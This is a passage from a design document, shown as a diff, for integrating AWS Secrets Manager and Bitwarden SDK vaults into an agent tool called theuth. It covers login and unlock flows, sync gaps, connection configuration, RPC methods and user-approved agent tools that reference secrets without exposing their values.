+- **HTTP.** The SDK builds its own `reqwest` 0.13 client: rustls with `rustls-platform-verifier`, and
+  `https_only(true)` in non-debug builds. It installs the ring provider with `let _ = install_default()`
+  (`sdk@2b06afa:crates/bitwarden-api-base/src/client.rs#L11-L33`). theuth installs aws-lc-rs first
+  (`crates/theuth/src/main.rs#L1584-L1586`), so the SDK's call is a no-op. Consequences:
+  - a plain-HTTP self-hosted server fails in release builds (`unsupported`, said on the connection
+    form);
+  - a private CA must be in the OS trust store;
+  - the HTTP client is not injectable (only `with_middleware`), so §6.2's CA-file idea is dropped.
+
+### 5.2 Login
+
+- **API key** (default, D12). `pm.0.auth().login_api_key(&ApiKeyLoginRequest { client_id,
+  client_secret, password })` (`sdk@2b06afa:crates/bitwarden-core/src/auth/auth_client.rs#L117-L122`,
+  `crates/bitwarden-core/src/auth/login/api_key.rs#L18-L93`).
+  - It does `client_credentials` with scope `api` and stores the tokens.
+  - It then **initialises user crypto in the same call** from the token response's
+    `userDecryptionOptions.masterPasswordUnlock`, which carries the KDF and the wrapped user key
+    (`api_key.rs#L41-L63`). So "login" and "unlock" are one call that needs the master password, and
+    **no prelogin endpoint is used**: the Vaultwarden-risky `POST /accounts/prelogin/password` is
+    never called on this path.
+  - Renewal re-runs `client_credentials` from the stored login method; there is no refresh token
+    (`sdk@2b06afa:crates/bitwarden-core/src/auth/renew.rs#L32-L40`).
+  - No 2FA and no new-device check apply to `client_credentials`.
+- **Password.** `login_password(&PasswordLoginRequest { email, password, two_factor })`
+  (`auth_client.rs#L109-L114`, `crates/bitwarden-core/src/auth/login/password.rs#L17-L152`). It
+  exists, but theuth does **not** use it:
+  - it always calls `prelogin` → `POST /accounts/prelogin/password` (`password.rs#L28`;
+    `crates/bitwarden-api-identity/src/apis/accounts_api.rs#L34-L35`);
+  - it hard-codes `DeviceType::ChromeBrowser`, device id `b86dd6ab-…` and name `firefox` for every
+    user of the SDK (`password.rs#L94-L100`), which collides on the server's known-device list;
+  - it has no `newDeviceOtp` field, and the new `bitwarden-auth` login has the variant commented out:
+    `// TODO: add new device verification response`
+    (`crates/bitwarden-auth/src/login/models/login_response.rs#L14-L15`).
+
+  theuth therefore makes the token request itself (§5.12 gap G7) with a per-connection random
+  device id. 2FA arrives as `TwoFactorProviders` (`crates/bitwarden-core/src/auth/login/response/two_factor/two_factor_providers.rs#L12-L26`)
+  and is answered with `TwoFactorRequest { token, provider, remember }` (`login/two_factor.rs#L67-L90`).
+  An email code is triggered with `send_two_factor_email` → `POST /two-factor/send-email-login`
+  (`two_factor.rs#L34-L65`). v1 supports Authenticator (TOTP), Email and YubiKey OTP (a typed
+  token). Duo and WebAuthn need a browser and are refused with a message pointing to API-key login.
+- **KDF.** `Kdf::{PBKDF2 { iterations }, Argon2id { iterations, memory, parallelism }}`
+  (`sdk@2b06afa:crates/bitwarden-crypto/src/keys/kdf.rs#L128-L137`). The SDK derives; theuth only
+  carries the struct.
+
+### 5.3 Unlock, lock, keys in memory
+
+- `crypto().initialize_user_crypto(InitUserCryptoRequest { user_id, kdf_params, email,
+  account_cryptographic_state, method, upgrade_token })` with
+  `InitUserCryptoMethod::MasterPasswordUnlock { password, master_password_unlock }`
+  (`sdk@2b06afa:crates/bitwarden-core/src/key_management/crypto_client.rs#L53-L67`,
+  `crates/bitwarden-core/src/key_management/crypto.rs#L82-L173`). This is used after theuth's own
+  password-login token request (§5.2) and after a restart on that path.
+- **Org keys.** `initialize_org_crypto(InitOrgCryptoRequest { organization_keys })`
+  (`crypto.rs#L424-L455`), fed from `profile.organizations[].key` after each sync
+  (`crates/bitwarden-api-api/src/models/profile_organization_response_model.rs#L227`).
+- **User id.** `create` / `edit` / `encrypt` need it (`MissingUserId`), and core login never sets it.
+  Pass `user_id` in the request, or `pm.0.internal.init_user_id`
+  (`crates/bitwarden-core/src/client/internal.rs#L249`). It is taken from the access token's `sub`,
+  as `bw` does (`crates/bw/src/main.rs#L198-L275`).
+- **Exportable user key.** `get_user_encryption_key() -> B64` (`crypto_client.rs#L141-L143`) and
+  `InitUserCryptoMethod::DecryptedKey` make Q1's "remember unlock" technically possible. The B64 is
+  not `Zeroizing`.
+- **Lock.** `unlock().lock()` → `KeyStore::clear()`
+  (`sdk@2b06afa:crates/bitwarden-unlock/src/unlock_client.rs#L243-L258`,
+  `crates/bitwarden-crypto/src/store/mod.rs#L144-L151`). theuth also drops the whole
+  `PasswordManagerClient`, so the memory DB (ciphers, still encrypted) goes with it.
+- **Zeroization.**
+  - Symmetric keys are `ZeroizeOnDrop`
+    (`sdk@2b06afa:crates/bitwarden-crypto/src/keys/symmetric_crypto_key.rs#L82`, `#L110`), and so is
+    the store backend (`store/backend/mod.rs#L21`).
+  - `bitwarden-crypto` installs a `#[global_allocator]` `ZeroizingAllocator` unless the feature
+    `no-memory-hardening` is on (`crates/bitwarden-crypto/src/lib.rs#L11-L13`). theuth already
+    defines its own (`crates/theuth/src/main.rs#L28-L29`; two allocators do not link), so
+    **`bitwarden-pm/no-memory-hardening` is mandatory**. Freed SDK memory is then not wiped (§11).
+  - Request structs carry passwords as plain `String`s.
+
+### 5.4 Sync and the cipher store (gaps G1–G4)
+
+- `SyncClient::sync(SyncRequest { force, exclude_subdomains }) -> Result<bool, SyncError>`. It does
+  `GET /accounts/revision-date`, then `GET /sync`, and hands `&SyncResponseModel` to the registered
+  `SyncHandler`s. It **returns no data** (`sdk@2b06afa:crates/bitwarden-sync/src/sync_client.rs#L118-L241`,
+  `crates/bitwarden-sync/src/handler.rs#L27-L38`).
+- The built-in handlers cover folders (`crates/bitwarden-vault/src/folder/folder_sync_handler.rs#L12-L48`),
+  Sends (`crates/bitwarden-send/src/send_sync_handler.rs#L38-L60`), policies and account crypto
+  state. There is **no cipher, collection, organisation or org-key handler**.
+- `pm.sync()` builds a fresh `SyncClient` per call (`sync_client.rs#L249-L253`), so handlers
+  registered on an earlier instance are lost. theuth keeps **one** `SyncClient` per connection.
+- On that client it registers `FolderSyncHandler`, `SendSyncHandler` and its own
+  `TheuthSyncHandler::on_sync`, which:
+  1. converts `ciphers` with `Cipher::try_from(CipherDetailsResponseModel)`
+     (`sdk@2b06afa:crates/bitwarden-vault/src/cipher/cipher.rs#L2013`) and `replace_all`s them into
+     `platform().state().get::<Cipher>()` (`crates/bitwarden-state/src/repository.rs#L43-L63`);
+  2. calls `initialize_org_crypto` from `profile.organizations`;
+  3. keeps `collections` (`Collection::try_from`, `crates/bitwarden-collections/src/collection.rs#L106`)
+     and the organisation names in theuth's own per-connection map, because `Collection` and
+     `ProfileOrganization` have no filler in the SDK
+     (`crates/bitwarden-organizations/src/organizations_client.rs#L11-L30`).
+- **Freshness.** Sync on unlock, before every `create` / `update` / Send create, and before a read
+  when the last sync is older than `sync_max_age_secs` (the revision-date check makes a no-change
+  sync one small request).
+
+### 5.5 List and decrypt
+
+- `ciphers().list() -> DecryptCipherListResult { successes: Vec<CipherListView>, failures }` and
+  `get(CipherId) -> CipherView` read the repository from §5.4
+  (`sdk@2b06afa:crates/bitwarden-vault/src/cipher/cipher_client/get.rs#L90-L118`,
+  `cipher.rs#L640-L645`).
+- `CipherType`: Login, SecureNote, Card, Identity, SshKey, BankAccount, DriversLicense, Passport
+  (`cipher.rs#L89-L98`). `revision_date: DateTime<Utc>` on `Cipher` / `CipherView` /
+  `CipherListView` (`cipher.rs#L354`, `#L512`, `#L606`) is `ExtVersion.id`.
+- Fields:
+  - `LoginView { username, password, uris, totp, … }`
+    (`sdk@2b06afa:crates/bitwarden-vault/src/cipher/login.rs#L345-L360`);
+  - `FieldView { name, value, r#type: FieldType, linked_id }`, with
+    `FieldType { Text, Hidden, Boolean, Linked }` (`crates/bitwarden-vault/src/cipher/field.rs#L24-L74`);
+  - `SecureNoteView` (`secure_note.rs#L55-L57`).
+- `#totp` uses `vault().totp()` to generate the current code from the seed (`vault_client.rs#L22-L60`).
+- v1 references Login and SecureNote; other types are `Unsupported` for `get` but listed.
+- Item names, folder names and field names are decrypted for `list` / `describe`. That is metadata
+  (§11 item 2). Field **values** are decrypted only inside `get`.
+
+### 5.6 Create and edit: the SDK does the HTTP
+
+- `ciphers().create(CipherCreateRequest { organization_id, collection_ids, folder_id, name, notes,
+  favorite, reprompt, r#type, fields, archived_date }) -> CipherView`. It encrypts (with a fresh
+  per-cipher key) and calls `POST /ciphers/create` when `collection_ids` is non-empty, else
+  `POST /ciphers`. It then writes the repository
+  (`sdk@2b06afa:crates/bitwarden-vault/src/cipher/cipher_client/create.rs#L44-L198`).
+- `ciphers().edit(CipherEditRequest { id, …, revision_date, … })` → `PUT /ciphers/{id}`. The original
+  must be in the repository (`edit.rs#L61-L92`, `#L197`, `#L274-L275`, `#L383-L406`). The request
+  carries `last_known_revision_date` (`cipher.rs#L197`, `#L273`, `#L459`), which the server checks.
+  This is the compare-and-swap `ExtBackend::update(expected)` relies on (§4).
+- `move_to_organization` (`cipher_client/mod.rs#L299-L306`), `share_cipher` → `PUT /ciphers/{id}/share`,
+  and `update_collection` → `PUT /ciphers/{id}/shared-folders_v2` exist; v1 does not use them (Q3).
+  Delete and soft delete exist (`delete.rs#L96-L135`); v1 does not call them (D13).
+- **`bw` is no reference for item writes:** `CreateCommands::Item(_) => unimplemented!("Create item
+  not implemented yet")` (`sdk@2b06afa:crates/bw/src/command/create.rs#L31`), and `List` / `Edit` /
+  `Delete` are `todo!()` (`crates/bw/src/main.rs#L122-L126`).
+
+### 5.7 Folders, collections, organisations
+
+- `folders().create(FolderAddEditRequest)` → `POST /folders`
+  (`sdk@2b06afa:crates/bitwarden-vault/src/folder/create.rs#L66-L77`). `edit` → `PUT /folders/{id}`.
+  `list` reads the repository the folder handler fills.
+- `collections()` is decrypt and encrypt only: no HTTP and no repository
+  (`sdk@2b06afa:crates/bitwarden-collections/src/collection_client.rs#L45-L101`). The destination
+  picker lists collections from the §5.4 map. Creating a collection is out of scope; a missing one
+  is an error on the card.
+- Organisations come from `profile.organizations` in the sync response (G4).
+
+### 5.8 State and persistence
+
+- `Repository<V>` (`get`, `list`, `set`, `set_bulk`, `remove`, `remove_all`, `replace_all`) and
+  `StateRegistry::{new_with_memory_db, new_with_db, register_client_managed, get, value, wipe}`
+  (`sdk@2b06afa:crates/bitwarden-state/src/repository.rs#L43-L63`,
+  `crates/bitwarden-state/src/registry.rs#L44-L127`).
+- theuth uses the memory DB only. Nothing the SDK holds touches disk.
+- What theuth persists itself, in `meta` (D11):
+  - client id and secret;
+  - for password login, the refresh token that theuth's own token request (G7) returns. That token is
+    handed to the SDK with `TokenHandler::set_tokens` plus `USER_LOGIN_METHOD = Username{..}`, so
+    the SDK renews from then on
+    (`sdk@2b06afa:crates/bitwarden-auth/src/token_management/password_manager_token_handler.rs#L17-L112`,
+    `crates/bitwarden-core/src/client/login_method.rs#L22-L35`).
+- `rusqlite` (`bundled`) is always compiled on native targets
+  (`sdk@2b06afa:crates/bitwarden-state/Cargo.toml#L40`), even with the memory DB.
+  - Range: `>=0.37, <0.42`.
+  - theuth's lock already has `rusqlite 0.38.0` on `libsqlite3-sys 0.36.0` (`Cargo.lock#L18883-L18884`,
+    `#L11881-L11882`), which is inside the range, so the two can unify under one `links = "sqlite3"`.
+  - B0 confirms the resolver picks it.
+
+### 5.9 Licence, versions, stability
+
+- `LICENSE#L1-L8`: "your choice of GPL v3.0 OR BITWARDEN SOFTWARE DEVELOPMENT KIT LICENSE". The
+  crates say `license = "GPL-3.0-only OR LicenseRef-Bitwarden-SDK"`
+  (`sdk@2b06afa:crates/bitwarden-pm/Cargo.toml#L14`). `bitwarden_license/` is SDK-licence-only, and
+  the `bitwarden-license` feature stays **off**.
+- Workspace version `4.0.0`, edition 2024, `rust-version = 1.89.0`, with exact inter-crate pins
+  (`=4.0.0`) (`sdk@2b06afa:Cargo.toml#L6-L16`).
+- `bitwarden-pm`: "Internal crate for the bitwarden crate. Do not use." (`crates/bitwarden-pm/Cargo.toml#L4`).
+- `README.md#L11-L12`: "The password manager interface is unstable and will change without
+  warning." Hence D3's pin and the one-module wrapper.
+
+### 5.10 What `secrets-bitwarden` depends on
+
+- **Dependencies.**
+  - `bitwarden-pm` (features: `no-memory-hardening`; **not** `uniffi`, `wasm`, `cli` or
+    `bitwarden-license`), `bitwarden-core`, `bitwarden-vault`, `bitwarden-send`, `bitwarden-sync`,
+    `bitwarden-crypto`, `bitwarden-collections`, `bitwarden-api-api` and `bitwarden-api-identity`;
+  - all with `git = "https://github.com/bitwarden/sdk-internal", rev = "2b06afa3b3579af116cd60f83d65b9e411fd2a56"`.
+- **Weight.** `bitwarden-pm` pulls in fido, exporters, importers (keepass), generators (zxcvbn),
+  send, policies and more unconditionally (`sdk@2b06afa:crates/bitwarden-pm/Cargo.toml#L72-L102`),
+  plus `rsa`, `ed25519-dalek`, `ml-dsa`, `argon2` and `rayon`.
+  - B0 measures it, and tries the lighter set (core + vault + send + sync + crypto without `pm`).
+  - `PasswordManagerClient` is only a newtype over `Client` plus sub-client constructors
+    (`sdk@2b06afa:crates/bitwarden-pm/src/lib.rs#L78-L286`), so dropping `pm` costs a few
+    constructor calls.
+  - The feature (D3) keeps the default build free of all of it.
+
+### 5.11 Vaultwarden and self-hosted compatibility
+
+| Area | Endpoint the SDK / theuth calls | Risk | Mitigation |
+|---|---|---|---|
+| API-key login | `POST /connect/token` `client_credentials`, `userDecryptionOptions.masterPasswordUnlock` in the response | Medium: older Vaultwarden omits `masterPasswordUnlock` → "logged in, crypto not initialised" (`password.rs#L55-L79` has the same shape) | Detect `!is_unlocked()` after login → fall back to G7's prelogin + `MasterPasswordUnlock` with the token's `Key`; B5's Vaultwarden suite pins the version tested |
+| Password prelogin | `POST /accounts/prelogin/password` | High on older Vaultwarden | theuth's own login (G7) tries it, then the legacy `POST /accounts/prelogin` |
+| Sync | `GET /accounts/revision-date`, `GET /sync` (`sdk@2b06afa:crates/bitwarden-api-api/src/apis/sync_api.rs#L29`) | Low | — |
+| Create / edit | `POST /ciphers`, `POST /ciphers/create`, `PUT /ciphers/{id}`; per-cipher `key`, `encryptedFor` | Medium: per-cipher keys need a recent Vaultwarden | B5 suite; error text names the server version |
+| Revoke on remove | `/identity/connect/revocation` | Not on every server | theuth forgets the tokens either way (§10) |
+| Sends | `POST /sends`, `PUT /sends/{id}`, `DELETE /sends/{id}` | Low for text Sends; `authType` email-OTP is new | §12.6 |
+| Plain HTTP | any | Release builds are `https_only` (§5.1) | Connection form refuses `http://` with the reason |
+
+### 5.12 Gaps theuth fills itself
+
+| Gap | What theuth calls | Cite |
+|---|---|---|
+| G1 cipher store after sync | `Cipher::try_from` + `Repository<Cipher>::replace_all` in `TheuthSyncHandler` | `sdk@2b06afa:crates/bitwarden-vault/src/cipher/cipher.rs#L2013` |
+| G2 org keys | `initialize_org_crypto` from `profile.organizations[].key` | `crates/bitwarden-core/src/key_management/crypto.rs#L424-L455` |
+| G3 collections | `Collection::try_from` + `collections().decrypt_list`; listing via `collections_api().get_user()` = `GET /collections` if not in sync | `crates/bitwarden-api-api/src/apis/collections_api.rs#L29-L105` |
+| G4 organisations | `profile.organizations` from the sync response (or `accounts_api().get_profile()` = `GET /accounts/profile`) | `crates/bitwarden-api-api/src/apis/accounts_api.rs#L55-L56` |
+| G5 user id | JWT `sub` → `InitUserCryptoRequest.user_id` / `init_user_id` | `crates/bitwarden-core/src/client/internal.rs#L249` |
+| G6 one `SyncClient` | keep the instance; register handlers once | `crates/bitwarden-sync/src/sync_client.rs#L249-L253` |
+| G7 password login | own `POST {identity}/connect/token` (password grant, per-connection device id, `twoFactorToken`/`twoFactorProvider`, `newDeviceOtp`); legacy prelogin fallback; then `set_tokens` + `USER_LOGIN_METHOD` + `MasterPasswordUnlock` | the SDK's request helper is `pub(crate)`: `crates/bitwarden-core/src/auth/api/request/mod.rs#L33-L45` |
+| G8 Send share URL | build `<web-vault>/#/send/<access_id>/<url-b64 key>` | §12.2 |
+
+G7 is the only place theuth speaks Bitwarden's protocol directly. It is about 150 lines, sits behind
+`login: password`, and is milestone B5b, so API-key users never run it.
+
+## 6. Connections
+
+### 6.1 AWS
+
+```yaml
+secrets:
+  connections:
+    prod:                          # CONN
+      backend: aws
+      profile: work-admin          # a name from AwsProfiles.profiles; null = default chain
+      region: eu-west-1            # required: Secrets Manager is regional
+      kms_key_id: alias/app        # optional default for create
+      prefix: app/                 # optional: list/browse scope (a ListSecrets name filter)
+```
+
+- **Profiles.** `AwsProfiles::load` / `from_sdk` (`crates/agent/src/aws.rs#L31-L51`) move to a new
+  small crate `crates/aws-profiles`, used by both `agent` and `secrets-aws`. `ListAwsProfiles` stays
+  in `agent` as a thin wrapper, so the RPC (`crates/agent/src/rpc_settings.rs#L164-L168`) is
+  unchanged. Selection for a connection is **independent** of `agent.aws_profile` (Bedrock): one can
+  infer on `personal` and read secrets from `work-admin`.
+- **Client.** One `aws_sdk_secretsmanager::Client` per connection, built from
+  `aws_config::defaults(BehaviorVersion::latest()).profile_name(p).region(r).timeout_config(…).load()`.
+  It is never built through `std::env` mutation, the rule `Auth.aws_profile` already follows
+  (`crates/agent/src/supervisor.rs#L12327-L12328`).
+- **SSO expiry.** The credentials error on an expired SSO token maps to
+  `ExtError::Expired("run aws sso login --profile work-admin, then retry")`. The connection shows
+  `Expired` in the UI. theuth does not run `aws sso login` itself: the device flow needs a browser,
+  and this is the user's own tool. A refreshable token is refreshed by `aws-config` silently.
+- **Credentials in theuth.** None. The AWS credential chain is the user's (`~/.aws`), as Bedrock's
+  is today. Nothing goes in the vault or in `meta`.
+
+### 6.2 Bitwarden
+
+```yaml
+secrets:
+  connections:
+    personal:
+      backend: bw
+      server: us                   # us | eu | self_hosted
+      base_url: null               # self_hosted: https://vault.example.org
+      api_url: null                # override; default <base>/api (us: https://api.bitwarden.com)
+      identity_url: null           # override; default <base>/identity (us: https://identity.bitwarden.com)
+      email: me@example.org        # shown on the unlock card; prelogin (KDF) needs it
+      login: api_key               # api_key | password
+      lock_after_idle_secs: 900    # 0 = lock only on quit; the unlock card reappears on next use
+      sync_max_age_secs: 300       # a read older than this syncs first (§5.4)
+      default_destination: { folder: "theuth", org: null, collection: null }
+```
+
+Lifecycle of a connection:
+
+```
+LoggedOut ──login(api key | password+2FA)──▶ Locked ──unlock(master password)──▶ Ready
+   ▲                                          ▲   │                                  │
+   └──────── logout / refresh token dead ─────┘   └──── lock (idle, quit, user) ◀───┘
+```
+
+- **Login, API key (default).** The user pastes `client_id` / `client_secret` (Account settings ›
+  Security › Keys › View API key) into a masked card once. Both go to `meta` as
+  `ext/bw/<conn>/client_id` and `ext/bw/<conn>/client_secret`, sealed with the engine key (D11).
+  - With this method, **"unlock" is a fresh `login_api_key` with the typed master password**. One SDK
+    call authenticates and initialises crypto from the token response's KDF and wrapped key (§5.2).
+  - So the states collapse to `LoggedOut` (no stored client secret) and `Locked` → `Ready`.
+  - Token renewal re-runs `client_credentials` in the SDK. There is no refresh token to keep.
+  - No 2FA and no new-device verification apply.
+- **Login, password (B5b).** Email + master password + optional 2FA code (Authenticator, Email,
+  YubiKey OTP; Duo and WebAuthn are refused because they need a browser) and an optional new-device
+  OTP, all on one masked card that grows a step when the server asks. theuth's own token request
+  (G7, §5.12) runs this, with a random per-connection device id kept in `meta`. Only the refresh
+  token is stored (`ext/bw/<conn>/refresh_token`). Later unlocks rebuild the client from it
+  (`set_tokens`) and run `MasterPasswordUnlock` with the typed master password, so a restart needs
+  no new 2FA.
+- **Unlock** turns the master password on the unlock card into the user key (KDF PBKDF2 or Argon2id,
+  run by the SDK, §5.2), then org keys after the first sync (§5.4). The master password lives in a
+  `Zeroizing<String>` from the RPC to the SDK request, where it becomes a plain `String`
+  (§5.3, §11). The user key stays in the SDK client's key store, in memory.
+- **Lock.** After `lock_after_idle_secs` without a `get` / `create` / `update`, on engine quit, on
+  the user's Lock button, and when the machine sleeps (desktop sends the existing power event; §14 Q2
+  asks whether to extend this). Lock drops the SDK client and keeps the refresh token.
+- **KDF.** The SDK handles both PBKDF2 and Argon2id. theuth never picks parameters. Argon2id at
+  Bitwarden's defaults (64 MiB, 3 iterations, 4 lanes) takes about a second; unlock runs on
+  `spawn_blocking`.
+- **Self-hosted TLS.** The SDK's own `reqwest` with `rustls-platform-verifier` (§5.1). A private
+  CA must be trusted by the OS. `http://` is refused in release builds (`https_only`), and the form
+  says why. No "accept invalid certificates" option exists, or is offered.
+- **Web vault URL** (for Send links, §12): `us` → `https://vault.bitwarden.com`, `eu` →
+  `https://vault.bitwarden.eu`, `self_hosted` → `base_url`. It can be overridden with `web_vault_url`.
+
+### 6.3 RPC (`crates/secrets/src/rpc.rs`, audience owner)
+
+```rust
+#[method(name = "list_secret_connections")]   async fn list_secret_connections(&self) -> RpcResult<Vec<ConnInfo>>;
+#[method(name = "add_secret_connection")]     async fn add_secret_connection(&self, conn: String, cfg: ConnConfig) -> RpcResult<ConnInfo>;
+#[method(name = "remove_secret_connection", with_extensions)] async fn remove_secret_connection(&self, conn: String) -> RpcResult<()>;
+#[method(name = "connection_login")]          async fn connection_login(&self, conn: String, form: LoginForm) -> RpcResult<LoginStep>;
+#[method(name = "connection_unlock")]         async fn connection_unlock(&self, conn: String, password: String) -> RpcResult<ConnInfo>;
+#[method(name = "connection_lock")]           async fn connection_lock(&self, conn: String) -> RpcResult<ConnInfo>;
+#[method(name = "list_external_secrets")]     async fn list_external_secrets(&self, conn: String, q: ListQuery) -> RpcResult<ListPage>;
+#[method(name = "answer_unlock")]             async fn answer_unlock(&self, id: RequestId, password: Option<String>) -> RpcResult<bool>;
+```
+
+- `ConnInfo` = `{ conn, backend, status, summary /* "work-admin · eu-west-1" | "me@… · vault.bitwarden.eu" */, ask: { read: bool, write: bool } }`.
+  `ask` is read from the always-ask global set.
+- `LoginForm` = `ApiKey { client_id, client_secret }` or
+  `Password { email, password, two_factor: Option<(provider, code)>, new_device_otp: Option<String> }`.
+- `LoginStep` = `Done | NeedTwoFactor { providers } | NeedNewDeviceOtp`.
+- `add_secret_connection` writes `config.yaml` with `runtime::write_config_value`
+  (`crates/runtime/src/lib.rs#L127-L133`) and adds the two always-ask entries **before** it registers
+  the backend, so there is never a window in which the connection is un-gated.
+- `remove_secret_connection` is a human press like 219 §2.4. It removes the `meta` rows, the config
+  entry and the two always-ask entries. Removing those entries along with the connection is not an
+  un-gating, because the connection is gone.
+- **Seeding by hand.** A connection added by hand-editing `config.yaml` is seeded at load: for each
+  connection without a `meta` stamp `ext/seeded/<conn>`, add both entries, then stamp. A user who
+  edits config by hand still starts at always-ask, and a later removal through Settings sticks
+  (the stamp exists).
+- **Values over the wire.** `connection_login`, `connection_unlock` and `answer_unlock` carry secrets
+  inbound only, like `set_secret` (37 §3.8): loopback-token or Noise-encrypted.
+
+## 7. Agent tools
+
+All in `crates/secrets/src/tools_external.rs`, registered only when at least one connection exists
+and `secrets.tools` is on. All share one prompt paragraph (§7.4). Style follows
+`crates/secrets/src/tools.rs`: receipts in plain text, a `structured` mirror, never a value or a
+length (37 D1).
+
+| Tool | Risk | Always-ask key it touches | `CONSUMES_SECRETS` |
+|---|---|---|---|
+| `secret_external_list` | `ReadOnly` | `…:read` of `connection` (every connection when absent) | false |
+| `secret_external_describe` | `ReadOnly` | `…:read` | false |
+| `secret_external_import` | `ReadOnly` (writes only the local vault, like `secret_capture`, 37 §3.2) | `…:read` | false |
+| `secret_external_create` | `Mutating` | `…:write` (+ `…:read` never) | false |
+| `secret_external_update` | `Destructive` (a Bitwarden field edit keeps no history; AWS keeps one previous stage) | `…:write` | false |
+| `secret_request` + `destination` | `ReadOnly` → `Mutating` via `credentialed` (D14) | `…:write` | false (as today) |
+| any tool with `{{secret:aws/…}}` / `{{secret:bw/…}}` | its own | `…:read` | true |
+
+`CONSUMES_SECRETS = false` on every `secret_external_*` tool: their args are references *as data*.
+`secret_external_list` with `query: "{{secret:bw/…}}"` must not expand, the same argument
+`crates/tools/src/lib.rs#L395-L405` makes for search tools. `external_access` (§3.3) knows these
+tools by name and reads `connection` / `ref` from their args.
+
+### 7.1 Reads
+
+```rust
+/// `secret_external_list`: what an external manager holds. Names and places, never values.
+pub struct ExtListArgs {
+    /// `prod`, `personal`; absent = the connections, with status, and nothing else (no read, no card).
+    pub connection: Option<String>,
+    /// Substring on name, folder, collection.
+    pub query: Option<String>,
+    /// From the previous page's `next`.
+    pub cursor: Option<String>,
+}
+// RETURNS = "list[dict]"
+// → no connection: "prod · aws · work-admin · eu-west-1 · ready\npersonal · bw · vault.bitwarden.eu · locked"
+// → "aws/prod/app/db/main · json · keys: host, password · AWSCURRENT 2026-11-02 · use {{secret:aws/prod/app/db/main#password}}"
+// → "bw/personal/2f1c…e9 · login \"GitHub\" · Personal / Dev · fields: password, username, totp, field:recovery · rev 2026-10-30"
+//   structured: [ExtEntry]
+// → "bw/personal is locked; the user was asked to unlock it" (after the card) | "… unlock declined"
+```
+
+`connection: None` touches no manager: it lists the engine's connections from config and status, so
+it is not a read and raises no card. That gives the model a free way to discover what exists.
+
+```rust
+/// `secret_external_describe`: one entry's versions and fields.
+pub struct ExtDescribeArgs { pub r#ref: String /* `aws/prod/app/db/main` or `bw/personal/<uuid>` */ }
+
+/// `secret_external_import`: copy an external value into the local vault under NAME, so later uses
+/// follow the local rules (37) and do not touch the manager. A snapshot: it does not follow rotations.
+pub struct ExtImportArgs {
+    pub r#ref: String,          // with #key / #field
+    pub name: String,           // local NAME
+    pub note: Option<String>,   // default "from <ref> <version>"
+    #[serde(default)] pub replace: bool,   // 37's guard
+    pub expires: Option<String>,           // 37/79's grammar; a TOTP import is refused (it is a 30 s code)
+}
+// → "stored GH v1 from bw/personal/2f1c…#password (rev 2026-10-30); {{secret:GH}}"
+```
+
+The `AWS keys` column is filled only from a `describe` whose card the user allowed. `describe` of an
+AWS secret does a `GetSecretValue` to learn the JSON key *names*, discards the values (zeroized), and
+returns only the names. So `describe` is a read and asks. Without it, the model cannot know to write
+`#password`.
+
+### 7.2 Writes
+
+```rust
+/// `secret_external_create`: put a local secret's current value into the external manager as a new entry.
+pub struct ExtCreateArgs {
+    pub connection: String,
+    /// Local NAME whose current value is written. Never a literal value (37 D5).
+    pub from: String,
+    pub destination: Destination,   // §7.3
+}
+// → "created aws/prod/app/ci/token (version 4b9e…, AWSCURRENT); use {{secret:aws/prod/app/ci/token}}"
+// → err "aws/prod/app/ci/token exists; secret_external_update replaces it"
+
+/// `secret_external_update`: replace an external value with a local secret's current value.
+pub struct ExtUpdateArgs {
+    pub r#ref: String,              // with #key (AWS JSON: that key only; the others are kept) / #field
+    pub from: String,               // local NAME
+    /// The version from `describe` / `list` (VersionId / revision date). Required: no blind writes.
+    pub expected: String,
+}
+// → "updated aws/prod/app/db/main#password: version 7c1d… is AWSCURRENT, 4b9e… is AWSPREVIOUS ({{secret:aws/prod/app/db/main:-1}})"
+// → "updated bw/personal/2f1c…#password (rev 2026-11-25T10:02Z; Bitwarden keeps the old password in the item's history)"
+// → err "bw/personal/2f1c… changed since rev 2026-10-30 (now 2026-11-20); describe it again"
+```
+
+`from` names a local secret, so the value path is always: the user's keyboard or a capture into the
+local vault (37), then from the vault to the manager. That makes `secret_capture` + `create` the way
+to push a freshly minted token (for example `gh auth token`) without the model ever seeing it.
+
+### 7.3 Collect and store: `secret_request` gains `destination`
+
+```rust
+pub struct RequestArgs {           // crates/secrets/src/tools.rs#L153-L174, plus:
+    /// Store the answer(s) in an external manager instead of (or as well as) the local vault.
+    #[serde(default)]
+    pub destination: Option<Destination>,
+}
+
+#[derive(Deserialize, JsonSchema)]
+pub struct Destination {
+    pub connection: String,
+    /// AWS: the secret name (`app/ci/token`). Bitwarden: the item's name (`GitHub — CI`).
+    pub name: String,
+    /// Update this entry instead of creating one (its `ref`). The card says "replaces".
+    pub replace: Option<String>,
+    /// Also keep a local copy under the field's `name` (default false: the manager is the truth).
+    #[serde(default)] pub keep_local: bool,
+    // AWS
+    pub kms_key_id: Option<String>,          // default: the connection's, else aws/secretsmanager
+    /// `string` (one field → SecretString) | `json` (every field → {"<field.name>": value}).
+    pub format: Option<AwsFormat>,
+    // Bitwarden
+    pub org: Option<String>, pub collection: Option<String>, pub folder: Option<String>,   // names; resolved to ids on the card
+    pub item: Option<BwKind>,                // login | secure_note
+    /// Per form field: which Bitwarden field it fills: `password` | `username` | `totp` | `notes` | `field:<name>`.
+    pub fields: Option<BTreeMap<String, String>>,
+    pub uri: Option<String>,                 // login items
+}
+// → "stored in aws/prod/app/ci/token (version 4b9e…); use {{secret:aws/prod/app/ci/token}}"
+// → "stored in bw/personal/9a0d… (login \"GitHub — CI\", Personal / theuth); use {{secret:bw/personal/9a0d…#password}}"
+// → "declined" | "no answer after 1800 s" | err from the manager (the value is discarded, never kept)
+```
+
+- **Flow.**
+  1. Gate: always-ask card for `…:write`, which shows the destination in the args.
+  2. The `SecretRequested` card, which gains `destination: Option<DestinationView>` (resolved
+     names, the item's current revision when `replace`).
+  3. The user may **change the destination on the card** (a picker, §9.3). The answer carries the
+     final destination.
+  4. Write. The receipt names where it went, and the model learns the final ref from it.
+- **Which engine writes.** The engine that owns the asking session (D15). `answer_secret` on another
+  engine forwards the answer there when the request row has a `destination`
+  (`crates/secrets/src/lib.rs#L111-L136` gains `destination`). The replicated row carries the
+  destination metadata, never the value.
+- **Username and URI.** These are not secret, and the card may show them unmasked
+  (`SecretRequestField.masked = false`, `crates/secrets/src/lib.rs#L92-L105`). They still never reach
+  the model as values: the receipt does not echo them.
+- **Failure.** If the write fails after the user typed the value, the value is dropped (zeroized) and
+  the receipt is the error. With `keep_local: true` the local copy is written first, so it survives;
+  the receipt says so.
+
+### 7.4 Prompt paragraph (appended to 37's block when a connection exists, ≈150 tokens)
+
+```
